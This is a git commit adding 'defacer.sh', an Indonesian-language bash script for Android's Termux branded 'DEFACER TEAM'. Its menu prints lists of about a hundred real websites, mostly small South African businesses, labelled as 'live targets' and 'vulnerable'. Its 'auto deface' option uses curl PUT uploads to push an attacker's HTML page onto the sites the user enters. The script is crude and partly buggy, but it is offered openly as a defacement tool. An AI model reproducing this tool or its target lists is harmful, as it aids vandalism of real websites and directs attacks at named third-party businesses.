d20fb3a88dd4613b39a80105ed2960260b9dd8e2
amenakun <50862294+amenakun@users.noreply.github.com>
2019-05-29 17:00:20 +0700

    Add files via upload
    Hello world :)

---
+++ defacer.sh
@@ -0,0 +1,272 @@
+red="\033[35;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+bash jr.sh
+echo
+echo $green
+echo "loading..........";
+sleep 0.1;
+clear
+echo $red
+echo "loading.................";
+sleep 0.1;
+clear
+echo $green
+echo "please wait!!.................";
+sleep 0.2;
+clear
+echo $green
+echo "please wait!!!...";
+sleep 0.1;
+clear
+echo "please wait!!........."
+sleep 0.1;
+clear
+echo "please wait!!!!....................";
+sleep 0.3;
+clear
+echo
+echo
+echo
+echo
+echo
+toilet -f future "   DEFACER TEAM" | lolcat
+echo
+echo $red"======================================================$red"
+echo
+echo "created by : root amena
+Facebook   : Amena Gans " | lolcat
+echo
+echo $red"======================================================$red"
+echo " (1) Tebas Index" | lolcat
+echo
+echo " (2) Kumpulan web vuln" | lolcat
+echo
+echo " (3) Auto deface" | lolcat
+echo $red"######################################################"$red
+echo " PLEASE CHOOSE!!" | lolcat
+read -p "╰─$ " apa
+echo
+if [ $apa = "1" ] 
+then
+echo
+echo
+echo
+clear
+echo
+toilet -f future " WELCOME MASTAH" | lolcat
+echo
+echo "simpan sc di memory internal dan luar folder " | lolcat
+echo
+echo
+toilet -f future " Live Target" | lolcat
+echo
+echo $cyan "http://contsol.co.za"
+echo $red "http://colourfactory.co.za"
+echo $cyan "http://crimsonmonkeyweb.com"
+echo $red "http://centraltech.co.za"
+echo $cyan "http://windmillsandporcupines.co.za"
+echo $red "http://chasingfantasia.com"
+echo $cyan "http://chillibitez.co.za"
+echo $red "http://cblandscapes.co.za"
+echo $cyan "http://kevinbutho.com"
+echo $red "http://prorepafrica.com"
+echo $cyan "http://xposurephotography.co.za"
+echo $red "http://techdirect.co.za"
+echo $cyan "http://tcnig.co.za"
+echo $red "http://valdicare.co.za"
+echo $cyan "http://thehellenic.co.za"
+echo
+echo $yellow " salin link yg diatas terus taro bawah"
+echo $green
+echo "root@mena" | lolcat
+read -p " ╰─$ " target 
+echo
+echo $yellow" masukkan script anda"$red
+echo $green
+echo " nama script harus berformat.HTML" | lolcat
+read -p " ╰─$ " script
+curl -T /storage/emulated/0/$script     $target
+echo " Sucsess" "$target" | lolcat
+echo
+echo $y"["$red"B"$yellow"]"$white"back "$red"["$green"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apa = "2" ]
+then
+echo
+clear
+echo $cyan
+echo "loading Mastah################"
+sleep 0.3
+echo
+clear
+echo $yellow
+echo "loading Mastah##################################"
+sleep 0.2
+clear
+echo
+echo $green
+echo "AMENA GANS ON#########################"
+sleep 0.4
+clear
+echo
+toilet -f future "  List Web Vuln" | lolcat
+echo
+echo "menganalisis..............." | lolcat
+sleep 0.5
+echo "Silahkan di pilih web vuln nya" | lolcat
+echo " [#] http://bitsandpieces.co.za
+[#] http://cblandscapes.co.za
+[#] http://windmillsandporcupines.co.za
+[#] http://scnc.co.za
+[#] http://contsol.co.za
+[#] http://consultec.co.za
+[#] http://colourfactory.co.za
+[#] http://ayk.co.za
+[#] http://daretogowildafrica.co.za
+[#] http://floralandfresh.co.za
+[#] http://foodconsult.co.za
+[#] http://itsengineering.co.za
+[#] http://hybriddevelopments.co.za
+[#] http://holotropicbreathwork.co.za
+[#] http://hanover-cs.co.za
+[#] http://handj.co.za
+[#] htp://lwrm.co.za
+[#] http://lubbestrust.co.za
+[#] http://lpenterprises.co.za
+[#] http://kwalitycommodities.co.za
+[#] http://mestern.co.za
+[#] http://megro.co.za
+[#] http://bitpc.co.za
+[#] http://butterflowers.co.za
+[#] http://beeit.co.za
+[#] http://esfml.com
+[#] http://bee-it.co.za
+[#] http://mc3qs.com
+[#] http://marjoriebresler.com
+[#] http://naturaleyeimages.com
+[#] http://my-resume.biz
+[#] http://mpark.co.za
+[#] http://montdestin.com
+[#] http://africa-one.co.za
+[#] http://ads247.co.za
+[#] http://accelerate-kids.co.za
+[#] http://8x8.co.za
+[#] http://aaglcapetown2013.org.za
+[#] http://allpaint.co.za
+[#] http://andrewswebcorner.co.za
+[#] http://applebyguesthouse.com
+[#] http://atlanticphysio.co.za
+[#] http://page31.co.za
+[#] http://vaigaidigitals.com
+[#] http://systemshouse.co.za
+[#] http://www.studentsonline.co.za
+[#] http://lucaniphysio.co.za
+[#] http://www.onboardpublications.co.za
+[#] http://www.oilandclay.co.za
+[#] http://www.aquafitness.za.net
+[#] http://www.helderbergit.co.za
+[#] http://www.pipelinetape.co.za
+[#] http://www.drcrsaexpress.co.za
+[#] http://officeelf.co.za
+[#] http://troop-1539.org
+[#] http://happy.mikikk.co.jp
+[#] http://www.alfunctiondesigns.co.za
+[#] http://mix007.co.za
+[#] http://spyroom.co.za
+[#] http://sportspod.co.za
+[#] http://southernafricablog.com
+[#] http://stand66.com
+[#] http://tapifare.com
+[#] http://tankertech.co.za
+[#] http://tcnig.co.za
+[#] http://tcmgroup.co.za
+[#] http://tressor.co.za
+[#] http://trafficam.co.za
+[#] http://tuthukani.co.za
+[#] http://nyarhi.co.za
+[#] http://digishop.co.za
+[#] http://elinemsa.co.za
+[#] http://disucctv.co.za
+[#] http://www.cai.co.za
+[#] http://tirupurjobs.net
+[#] http://inlislitev3.perpusnas.go.id
+[#] http://clcooling.co.za
+[#] http://sublimeconfectionery.co.za
+[#] http://gogreenplumbing.co.za
+[#] http://golfbuzz.co.za
+[#] http://grupo-cma.com
+[#] http://inkspot.co.za
+[#] http://kgarebana.co.za
+[#] http://ittrader.co.za
+[#] http://hellomobile.mobi
+[#] http://homebuzz.co.za
+[#] http://gordonhoward.co.za
+[#] http://democonstruction.co.za
+[#] http://chasingfantasia.co.za
+[#] http://litehouse.co.za
+[#] http://ldata.co.za
+[#] http://lunique.co.za
+[#] http://chillibitez.co.za
+[#] http://cmweb.co.za
+[#] http://essentialtours.com
+[#] http://entitledvip.com
+[#] http://frankadesign.com
+[#] http://forget-me-not.co.za
+[#] http://findpersonnel.co.za
+[#] http://everythingdating.co.za" | lolcat
+
+echo $green
+echo "Press Enter for exit Mastah!"
+read -p "Enter :" back
+fi
+
+if [ $apa = "3" ]
+then
+
+clear
+echo
+toilet -f future " AUTO DEFACE" | lolcat
+echo
+echo $green"WELCOME MASTAH!! "
+echo
+echo "Masukkan script deface anda" | lolcat
+echo $green
+echo "root@mena" | lolcat
+read -p " ╰─$ " script
+echo
+echo " Masukkan Link Target 1" | lolcat
+read -p " ╰─$ " target1
+curl -T storage/emulated/0/$script $target1
+echo "sucsess" | lolcat
+echo $green"✓"$red"$target1/$script"
+echo " Masukkan Link Target 2" | lolcat
+read -p " ╰─$ " target2
+curl -T storage/emulated/0/$script $target2
+echo "sucsess" | lolcat
+echo $green"✓"$red"$target2/$script"
+echo " Masukkan Link Target 3" | lolcat
+read -p " ╰─$ " target3
+curl -T storage/emulated/0/$script $target3
+echo "sucsess" | lolcat
+echo $green"✓"$red"$target3/$script"
+echo " Masukkan Link Target 4" | lolcat
+read -p " ╰─$ " target4
+curl -T storage/emulated/0/$script $target4
+echo "sucsess" | lolcat
+echo $green"✓"$red"$target4/$script"
+echo " Masukkan Link Target 5" | lolcat
+read -p " ╰─$ " target5
+curl -T storage/emulated/0/$script $target5
+echo "sucsess" | lolcat
+echo $green"✓"$red"$target5/$script"
+echo $red"[Q]uit"
+read -p "Q" : Quit
+fi
